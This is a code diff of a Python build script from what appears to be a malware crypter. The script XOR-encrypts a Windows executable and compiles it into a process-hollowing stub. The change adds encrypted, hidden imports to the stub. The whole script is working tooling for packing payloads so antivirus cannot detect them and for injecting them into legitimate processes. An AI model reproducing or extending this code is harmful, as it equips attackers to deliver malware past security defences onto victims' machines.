@@ -1,13 +1,11 @@
-from itertools import cycle
-from operator import xor
+from cookiecutter.main import cookiecutter
 import os
 import pefile
+import secrets
 import subprocess
 import uuid
 
-import secrets
-import binascii
-from cookiecutter.main import cookiecutter
+from encryption import *
 
 
 def build(file_data, target_exe="same", build_type="release", key_type="randomKey", key_length="32", custom_key=""):
@@ -16,6 +14,8 @@ def build(file_data, target_exe="same", build_type="release", key_type="randomKe
         key_length = len(custom_key)
     else:
         key = secrets.token_bytes(key_length)
+    imports_key_length = 11
+    imports_key = secrets.token_bytes(imports_key_length)
     encrypted_data = encrypt(key, file_data)
     temp_path = os.path.join("/stubborn/tmp", str(uuid.uuid4()))
     pe = pefile.PE(data=file_data)
@@ -23,9 +23,13 @@ def build(file_data, target_exe="same", build_type="release", key_type="randomKe
     target_exe_type, target_exe = get_target_exe(target_exe, pe.OPTIONAL_HEADER.Magic)
     if not compiler or not windres:
         return
-    cookiecutter_data = {"target_dir": temp_path, "encryption_key": decode_key(key),
-                         "key_length": key_length, "target_exe_type": target_exe_type, "target_exe": target_exe,
-                         "build_type": build_type.capitalize(), "compiler": compiler, "windres": windres}
+    cookiecutter_data = {
+        "target_dir": temp_path, "encryption_key": decode_key(key), "key_length": key_length,
+        "target_exe_type": target_exe_type, "target_exe": target_exe, "build_type": build_type.capitalize(),
+        "compiler": compiler, "windres": windres, "imports_key": decode_key(imports_key),
+        "imports_key_length": imports_key_length
+    }
+    cookiecutter_data.update(get_encrypted_imports(imports_key))
     cookiecutter("/stubborn/stub_templates/process_hollowing/", no_input=True, extra_context=cookiecutter_data)
     encrypted_file = os.path.join(temp_path, "crypt.exe")
     with open(encrypted_file, mode="wb") as f:
@@ -38,17 +42,6 @@ def build(file_data, target_exe="same", build_type="release", key_type="randomKe
         return file_path
     else:
         return None
-
-
-def decode_key(key):
-    if isinstance(key, bytearray):
-        return key.decode("unicode_escape")
-    hex = str(binascii.hexlify(key), 'ascii')
-    return "\\x{}".format('\\x'.join(hex[i:i + 2] for i in range(0, len(hex), 2)))
-
-
-def encrypt(key, data):
-    return bytearray(map(xor, data, cycle(key)))
 
 
 def get_compiler_windres(pe_arch):
